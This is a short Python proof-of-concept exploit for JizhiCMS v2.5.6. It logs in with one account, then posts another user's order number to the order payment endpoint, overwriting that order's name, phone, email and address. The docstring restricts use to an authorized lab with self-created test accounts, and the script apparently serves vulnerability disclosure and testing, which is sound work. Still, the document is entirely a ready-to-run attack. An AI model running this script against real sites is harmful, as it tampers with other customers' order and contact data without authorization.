#!/usr/bin/env python3
"""JizhiCMS v2.5.6: authenticated cross-user order information overwrite PoC.
Use only against an authorized lab instance with two self-created test accounts.
"""
import argparse, json, sys
import requests

p = argparse.ArgumentParser()
p.add_argument('base', help='Base URL, e.g. http://127.0.0.1:18080')
p.add_argument('--login-tel', required=True)
p.add_argument('--password', required=True)
p.add_argument('--orderno', required=True)
p.add_argument('--marker', default='POC-CROSS-USER')
p.add_argument('--tel', default='18800000000')
p.add_argument('--email', default='poc@example.test')
p.add_argument('--address', default='POC-CROSS-USER-ADDRESS')
args = p.parse_args()

s = requests.Session()
root = args.base.rstrip('/') + '/index.php'
r = s.post(root + '/login/index', data={
    'tel': args.login_tel, 'password': args.password, 'ajax': '1'
}, timeout=15)
r.raise_for_status()
login = r.json()
if login.get('code') != 0:
    raise SystemExit('login failed: ' + json.dumps(login, ensure_ascii=False))

r = s.post(root + '/order/pay', data={
    'go': '1', 'orderno': args.orderno,
    'username': args.marker, 'tel': args.tel,
    'email': args.email, 'address': args.address,
    'paytype': '1', 'ajax': '1'
}, timeout=15)
r.raise_for_status()
print(json.dumps({
    'login': login,
    'pay_response': r.json(),
    'request': {
        'method': 'POST', 'url': root + '/order/pay',
        'data': {
            'go': '1', 'orderno': args.orderno,
            'username': args.marker, 'tel': args.tel,
            'email': args.email, 'address': args.address,
            'paytype': '1', 'ajax': '1'
        }
    }
}, ensure_ascii=False, indent=2))
